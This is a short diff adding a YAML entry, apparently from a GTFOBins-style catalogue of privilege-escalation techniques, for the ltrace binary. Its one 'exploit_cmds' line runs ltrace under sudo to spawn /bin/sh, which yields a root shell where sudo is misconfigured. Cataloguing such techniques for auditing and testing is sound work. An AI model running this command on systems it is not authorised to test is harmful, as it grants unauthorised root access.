@@ -1,0 +1,4 @@
+name: ltrace
+binary_path: /usr/bin/ltrace
+exploit_cmds:
+- sudo /usr/bin/ltrace -b -L /bin/sh
